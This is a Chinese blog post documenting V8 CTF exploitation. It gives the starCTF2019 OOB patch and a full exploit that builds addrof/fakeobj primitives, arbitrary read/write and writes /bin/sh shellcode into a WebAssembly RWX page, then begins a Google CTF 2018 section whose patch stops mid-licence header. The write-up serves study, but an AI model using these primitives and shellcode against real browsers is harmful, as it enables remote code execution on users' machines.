        <content type="html"><![CDATA[<p>之前一直以为V8 Pwn是很高深莫测的东西，学了之后发现和PHP Pwn差不多，基本都是通过出题人自己定义的方法上的漏洞进行利用，php pwn是so的拓展，V8是diff文件。当然还有一些直接用CVE出题的</p><h3 id="V8基础"><a href="#V8基础" class="headerlink" title="V8基础"></a>V8基础</h3><p>环境搭建和动态调试网上有很多写的很详细，这里就不详细讲了，主要注意一下js 的object的结构体就行</p><p><img src="/2025/12/08/V8Pwn%E7%9A%84%E5%AD%A6%E4%B9%A0/index/4.png" alt="img"></p><p>做题时一般出题人会给diff文件和对应的V8版本，退回到之前的版本加上diff文件构建就行</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">git reset --hard id</span><br><span class="line">gclient sync</span><br><span class="line">git apply &lt; patch.diff</span><br><span class="line">tools/dev/v8gen.py x64.debug</span><br><span class="line">ninja -C out.gn/x64.debug d8</span><br><span class="line">tools/dev/v8gen.py x64.release</span><br><span class="line">ninja -C out.gn/x64.release d8</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>下面记录一下自己刷的V8题</p><h3 id="starCTF2019-OOB"><a href="#starCTF2019-OOB" class="headerlink" title="starCTF2019-OOB"></a>starCTF2019-OOB</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">fetch v8</span><br><span class="line">cd v8</span><br><span class="line">git reset --hard 6dc88c191f5ecc5389dc26efa3ca0907faef3598</span><br><span class="line">gclient sync</span><br><span class="line">git apply &lt; oob.diff</span><br><span class="line">tools/dev/v8gen.py x64.debug</span><br><span class="line">ninja -C out.gn/x64.debug d8</span><br><span class="line">tools/dev/v8gen.py x64.release</span><br><span class="line">ninja -C out.gn/x64.release d8</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br></pre></td><td class="code"><pre><span class="line">diff --git a/src/bootstrapper.cc b/src/bootstrapper.cc</span><br><span class="line">index b027d36..ef1002f 100644</span><br><span class="line">--- a/src/bootstrapper.cc</span><br><span class="line">+++ b/src/bootstrapper.cc</span><br><span class="line">@@ -1668,6 +1668,8 @@ void Genesis::InitializeGlobal(Handle&lt;JSGlobalObject&gt; global_object,</span><br><span class="line">                           Builtins::kArrayPrototypeCopyWithin, 2, false);</span><br><span class="line">     SimpleInstallFunction(isolate_, proto, &quot;fill&quot;,</span><br><span class="line">                           Builtins::kArrayPrototypeFill, 1, false);</span><br><span class="line">+    SimpleInstallFunction(isolate_, proto, &quot;oob&quot;,</span><br><span class="line">+                          Builtins::kArrayOob,2,false);</span><br><span class="line">     SimpleInstallFunction(isolate_, proto, &quot;find&quot;,</span><br><span class="line">                           Builtins::kArrayPrototypeFind, 1, false);</span><br><span class="line">     SimpleInstallFunction(isolate_, proto, &quot;findIndex&quot;,</span><br><span class="line">diff --git a/src/builtins/builtins-array.cc b/src/builtins/builtins-array.cc</span><br><span class="line">index 8df340e..9b828ab 100644</span><br><span class="line">--- a/src/builtins/builtins-array.cc</span><br><span class="line">+++ b/src/builtins/builtins-array.cc</span><br><span class="line">@@ -361,6 +361,27 @@ V8_WARN_UNUSED_RESULT Object GenericArrayPush(Isolate* isolate,</span><br><span class="line">   return *final_length;</span><br><span class="line"> &#125;</span><br><span class="line"> &#125;  // namespace</span><br><span class="line">+BUILTIN(ArrayOob)&#123;</span><br><span class="line">+    uint32_t len = args.length();</span><br><span class="line">+    if(len &gt; 2) return ReadOnlyRoots(isolate).undefined_value();</span><br><span class="line">+    Handle&lt;JSReceiver&gt; receiver;</span><br><span class="line">+    ASSIGN_RETURN_FAILURE_ON_EXCEPTION(</span><br><span class="line">+            isolate, receiver, Object::ToObject(isolate, args.receiver()));</span><br><span class="line">+    Handle&lt;JSArray&gt; array = Handle&lt;JSArray&gt;::cast(receiver);</span><br><span class="line">+    FixedDoubleArray elements = FixedDoubleArray::cast(array-&gt;elements());</span><br><span class="line">+    uint32_t length = static_cast&lt;uint32_t&gt;(array-&gt;length()-&gt;Number());</span><br><span class="line">+    if(len == 1)&#123;</span><br><span class="line">+        //read</span><br><span class="line">+        return *(isolate-&gt;factory()-&gt;NewNumber(elements.get_scalar(length)));</span><br><span class="line">+    &#125;else&#123;</span><br><span class="line">+        //write</span><br><span class="line">+        Handle&lt;Object&gt; value;</span><br><span class="line">+        ASSIGN_RETURN_FAILURE_ON_EXCEPTION(</span><br><span class="line">+                isolate, value, Object::ToNumber(isolate, args.at&lt;Object&gt;(1)));</span><br><span class="line">+        elements.set(length,value-&gt;Number());</span><br><span class="line">+        return ReadOnlyRoots(isolate).undefined_value();</span><br><span class="line">+    &#125;</span><br><span class="line">+&#125;</span><br><span class="line"> </span><br><span class="line"> BUILTIN(ArrayPush) &#123;</span><br><span class="line">   HandleScope scope(isolate);</span><br><span class="line">diff --git a/src/builtins/builtins-definitions.h b/src/builtins/builtins-definitions.h</span><br><span class="line">index 0447230..f113a81 100644</span><br><span class="line">--- a/src/builtins/builtins-definitions.h</span><br><span class="line">+++ b/src/builtins/builtins-definitions.h</span><br><span class="line">@@ -368,6 +368,7 @@ namespace internal &#123;</span><br><span class="line">   TFJ(ArrayPrototypeFlat, SharedFunctionInfo::kDontAdaptArgumentsSentinel)     \</span><br><span class="line">   /* https://tc39.github.io/proposal-flatMap/#sec-Array.prototype.flatMap */   \</span><br><span class="line">   TFJ(ArrayPrototypeFlatMap, SharedFunctionInfo::kDontAdaptArgumentsSentinel)  \</span><br><span class="line">+  CPP(ArrayOob)                                                                \</span><br><span class="line">                                                                                \</span><br><span class="line">   /* ArrayBuffer */                                                            \</span><br><span class="line">   /* ES #sec-arraybuffer-constructor */                                        \</span><br><span class="line">diff --git a/src/compiler/typer.cc b/src/compiler/typer.cc</span><br><span class="line">index ed1e4a5..c199e3a 100644</span><br><span class="line">--- a/src/compiler/typer.cc</span><br><span class="line">+++ b/src/compiler/typer.cc</span><br><span class="line">@@ -1680,6 +1680,8 @@ Type Typer::Visitor::JSCallTyper(Type fun, Typer* t) &#123;</span><br><span class="line">       return Type::Receiver();</span><br><span class="line">     case Builtins::kArrayUnshift:</span><br><span class="line">       return t-&gt;cache_-&gt;kPositiveSafeInteger;</span><br><span class="line">+    case Builtins::kArrayOob:</span><br><span class="line">+      return Type::Receiver();</span><br><span class="line"> </span><br><span class="line">     // ArrayBuffer functions.</span><br><span class="line">     case Builtins::kArrayBufferIsView:</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>diff文件定义了一个oob方法，漏洞点在将数组元素和数组长度混淆了，导致会溢出1的元素，有点像off by one</p><p>oob()无参数时会返回elements[length]的值，带参数时会将参数写入elements[length]</p><p>通过调试可以发现float类型和obj类型的数组他们的elements是挨着他们的map的，所以刚好可以泄露map和往map里写数据，这里就可以构造一个类型混淆，通过混淆float类型的数组为obj可以在任意地址伪造一个fake_obj，将obj类型的数组混淆为float可以泄露obj数组储存的对象的地址，那么这样就可以通过自己伪造一个数组然后控制element进行任意地址读写了，最后通过改ArrayBuffer的backing_store的地址 在WasmInstance开辟的rwx内存写shellcode</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br></pre></td><td class="code"><pre><span class="line">class Helpers &#123;</span><br><span class="line">  constructor() &#123;</span><br><span class="line">    this.buf = new ArrayBuffer(8)</span><br><span class="line">    this.f64 = new Float64Array(this.buf)</span><br><span class="line">    this.f32 = new Float32Array(this.buf)</span><br><span class="line">    this.u32 = new Uint32Array(this.buf)</span><br><span class="line">    this.u64 = new BigUint64Array(this.buf)</span><br><span class="line">    this.i64 = new BigInt64Array(this.buf)</span><br><span class="line"></span><br><span class="line">    this.state = &#123;&#125;</span><br><span class="line">    this.i = 0</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">  p(arg) &#123;</span><br><span class="line">    %DebugPrint(arg)</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  debug(arg) &#123;</span><br><span class="line">    %DebugPrint(arg)</span><br><span class="line">    %SystemBreak()</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  stop() &#123;</span><br><span class="line">    %SystemBreak()</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">  // float64 → uint64</span><br><span class="line">  f64toi64(f) &#123;</span><br><span class="line">    this.f64[0] = f</span><br><span class="line">    return this.u64[0]</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  // uint64 → float64</span><br><span class="line">  i64tof64(i) &#123;</span><br><span class="line">    this.u64[0] = i</span><br><span class="line">    return this.f64[0]</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  // float64 → int64</span><br><span class="line">  f64toi64signed(f) &#123;</span><br><span class="line">    this.f64[0] = f</span><br><span class="line">    return this.i64[0]</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  // int64 → float64</span><br><span class="line">  i64tof64signed(i) &#123;</span><br><span class="line">    this.i64[0] = i</span><br><span class="line">    return this.f64[0]</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  // float64 → low 32-bit</span><br><span class="line">  f64toi32lo(f) &#123;</span><br><span class="line">    this.f64[0] = f</span><br><span class="line">    return this.u32[0]</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  // float64 → high 32-bit</span><br><span class="line">  f64toi32hi(f) &#123;</span><br><span class="line">    this.f64[0] = f</span><br><span class="line">    return this.u32[1]</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  // two 32-bit → float64 </span><br><span class="line">  i32pairtof64(lo, hi) &#123;</span><br><span class="line">    this.u32[0] = lo &gt;&gt;&gt; 0</span><br><span class="line">    this.u32[1] = hi &gt;&gt;&gt; 0</span><br><span class="line">    return this.f64[0]</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  // int64 → low 32-bit</span><br><span class="line">  i64to32lo(i) &#123;</span><br><span class="line">    this.i64[0] = i</span><br><span class="line">    return this.u32[0]</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  // int64 → high 32-bit</span><br><span class="line">  i64to32hi(i) &#123;</span><br><span class="line">    this.i64[0] = i</span><br><span class="line">    return this.u32[1]</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  // float32 → int32</span><br><span class="line">  f32toi32(f) &#123;</span><br><span class="line">    this.f32[0] = f</span><br><span class="line">    return this.u32[0]</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  // int32 → float32</span><br><span class="line">  i32tof32(i) &#123;</span><br><span class="line">    this.u32[0] = i</span><br><span class="line">    return this.f32[0]</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">  hex32(i) &#123;</span><br><span class="line">    return i.toString(16).padStart(8, &quot;0&quot;)</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  hex64(i) &#123;</span><br><span class="line">    return i.toString(16).padStart(16, &quot;0&quot;)</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  hexx(str, val) &#123;</span><br><span class="line">    console.log(`[*] $&#123;str&#125;: 0x$&#123;val.toString(16)&#125;`)</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  printhex(val) &#123;</span><br><span class="line">    console.log(&quot;0x&quot; + val.toString(16))</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  /* ------------------ GC / state ------------------ */</span><br><span class="line"></span><br><span class="line">  add_ref(obj) &#123;</span><br><span class="line">    this.state[this.i++] = obj</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  gc() &#123;</span><br><span class="line">    new ArrayBuffer(0x7fe00000)</span><br><span class="line">    new ArrayBuffer(0x7fe00000)</span><br><span class="line">    new ArrayBuffer(0x7fe00000)</span><br><span class="line">    new ArrayBuffer(0x7fe00000)</span><br><span class="line">    new ArrayBuffer(0x7fe00000)</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line">let helper = new Helpers()</span><br><span class="line"> </span><br><span class="line"></span><br><span class="line"> </span><br><span class="line">let obj = &#123;&#125;</span><br><span class="line">let obj_list = [obj];</span><br><span class="line">let float_list = [4.3];</span><br><span class="line"> </span><br><span class="line">let obj_list_map = obj_list.oob()</span><br><span class="line">let float_list_map = float_list.oob()</span><br><span class="line"></span><br><span class="line">function get_addr(obj)&#123;</span><br><span class="line">  obj_list[0] = obj</span><br><span class="line">  obj_list.oob(float_list_map)</span><br><span class="line">  let res =  helper.f64toi64(obj_list[0]) - 1n</span><br><span class="line">  obj_list.oob(obj_list_map)</span><br><span class="line">  return res</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">function get_obj(addr)&#123;</span><br><span class="line">  float_list[0] = helper.i64tof64(addr | 1n)</span><br><span class="line">  float_list.oob(obj_list_map)</span><br><span class="line">  let res = float_list[0]</span><br><span class="line">  float_list.oob(float_list_map)</span><br><span class="line">  return res</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">let evil_float_array = [</span><br><span class="line">  float_list_map,                               //map</span><br><span class="line">  helper.i64tof64(0n),                         //properties</span><br><span class="line">  helper.i64tof64(0xdeadbeefn),               //elements*</span><br><span class="line">  helper.i64tof64((0x80n &lt;&lt; 32n) | 0n),      //lenth</span><br><span class="line">  helper.i64tof64(0xdeadbeefn),</span><br><span class="line">  helper.i64tof64(0xdeadbeefn),</span><br><span class="line">]</span><br><span class="line"></span><br><span class="line">let evil_float_array_addr = get_addr(evil_float_array)</span><br><span class="line">let evil_float_array_elements_addr = evil_float_array_addr + 0x30n</span><br><span class="line">let fake_obj = get_obj(evil_float_array_elements_addr)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">function arb_write(addr,data)&#123;</span><br><span class="line">  evil_float_array[2] = helper.i64tof64((addr - 0x10n) | 1n) //set fake_obj elements*</span><br><span class="line">  fake_obj[0] = helper.i64tof64(data)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">function arb_read(addr) &#123;</span><br><span class="line">  evil_float_array[2] = helper.i64tof64((addr - 0x10n) | 1n) //set fake_obj elements*</span><br><span class="line">  return helper.f64toi64(fake_obj[0])</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">let data_buf = new ArrayBuffer(0x1000)</span><br><span class="line">let data_view = new DataView(data_buf)</span><br><span class="line">let backing_store_addr = get_addr(data_buf) + 0x20n</span><br><span class="line"></span><br><span class="line">let wasm_code = new Uint8Array([</span><br><span class="line">  0, 97, 115, 109, 1, 0, 0, 0, 1, 133, 128, 128, 128, 0, 1, 96, 0, 1, 127, 3, 130, 128, 128, 128, 0,</span><br><span class="line">  1, 0, 4, 132, 128, 128, 128, 0, 1, 112, 0, 0, 5, 131, 128, 128, 128, 0, 1, 0, 1, 6, 129, 128, 128,</span><br><span class="line">  128, 0, 0, 7, 145, 128, 128, 128, 0, 2, 6, 109, 101, 109, 111, 114, 121, 2, 0, 4, 109, 97, 105,</span><br><span class="line">  110, 0, 0, 10, 142, 128, 128, 128, 0, 1, 136, 128, 128, 128, 0, 0, 65, 239, 253, 182, 245, 125,</span><br><span class="line">  11,</span><br><span class="line">])</span><br><span class="line">let wasm_module = new WebAssembly.Module(wasm_code)</span><br><span class="line">let wasm_instance = new WebAssembly.Instance(wasm_module)</span><br><span class="line">let shell = wasm_instance.exports.main</span><br><span class="line">let wasm_instance_addr = get_addr(wasm_instance)</span><br><span class="line">let rwx_addr = arb_read(wasm_instance_addr + 0x88n)</span><br><span class="line"></span><br><span class="line">let shellcode = [</span><br><span class="line">    0x2fbb485299583b6an,</span><br><span class="line">    0x5368732f6e69622fn,</span><br><span class="line">    0x050f5e5457525f54n</span><br><span class="line">];</span><br><span class="line"></span><br><span class="line">arb_write(backing_store_addr,rwx_addr)</span><br><span class="line"></span><br><span class="line">for (let i = 0; i &lt; shellcode.length; i++) &#123;</span><br><span class="line">  data_view.setBigInt64(i * 8, shellcode[i], true)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">shell()</span><br></pre></td></tr></table></figure><h3 id="Google-CTF-2018-Just-In-Time"><a href="#Google-CTF-2018-Just-In-Time" class="headerlink" title="Google CTF 2018 Just-In-Time"></a>Google CTF 2018 Just-In-Time</h3><p>这是一道关于Turbon Fan优化的漏洞利用</p><h4 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">git reset --hard e0a58f83255d1dae907e2ba4564ad8928a7dedf4</span><br><span class="line">gclient sync</span><br><span class="line">git apply &lt; ./diff</span><br><span class="line">tools/dev/v8gen.py x64.debug</span><br><span class="line">ninja -C out.gn/x64.debug d8</span><br></pre></td></tr></table></figure><p>下面是patch文件，如果报错可能是windows复制的，换行符转成linux的就行了</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br></pre></td><td class="code"><pre><span class="line">diff --git a/BUILD.gn b/BUILD.gn</span><br><span class="line">index c6a58776cd..14c56d2910 100644</span><br><span class="line">--- a/BUILD.gn</span><br><span class="line">+++ b/BUILD.gn</span><br><span class="line">@@ -1699,6 +1699,8 @@ v8_source_set(&quot;v8_base&quot;) &#123;</span><br><span class="line">     &quot;src/compiler/dead-code-elimination.cc&quot;,</span><br><span class="line">     &quot;src/compiler/dead-code-elimination.h&quot;,</span><br><span class="line">     &quot;src/compiler/diamond.h&quot;,</span><br><span class="line">+    &quot;src/compiler/duplicate-addition-reducer.cc&quot;,</span><br><span class="line">+    &quot;src/compiler/duplicate-addition-reducer.h&quot;,</span><br><span class="line">     &quot;src/compiler/effect-control-linearizer.cc&quot;,</span><br><span class="line">     &quot;src/compiler/effect-control-linearizer.h&quot;,</span><br><span class="line">     &quot;src/compiler/escape-analysis-reducer.cc&quot;,</span><br><span class="line">diff --git a/src/compiler/duplicate-addition-reducer.cc b/src/compiler/duplicate-addition-reducer.cc</span><br><span class="line">new file mode 100644</span><br><span class="line">index 0000000000..59e8437f3d</span><br><span class="line">--- /dev/null</span><br><span class="line">+++ b/src/compiler/duplicate-addition-reducer.cc</span><br><span class="line">@@ -0,0 +1,71 @@</span><br><span class="line">+// Copyright 2018 Google LLC</span><br><span class="line">+//</span><br><span class="line">+// Licensed under the Apache License, Version 2.0 (the &quot;License&quot;);</span><br><span class="line">+// you may not use this file except in compliance with the License.</span><br><span class="line">+// You may obtain a copy of the License at</span><br><span class="line">+//</span><br><span class="line">+//      http://www.apache.org/licenses/LICENSE-2.0</span><br><span class="line">+//</span><br><span class="line">+// Unless required by applicable law or agreed to in writing, software</span><br><span class="line">+// distributed under the License is distributed on an &quot;AS IS&quot; BASIS,</span><br><span class="line">+// WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.</span><br><span class="line">+// See the License for the specific language governing permissions and</span><br><span class="line">+// limitations under the 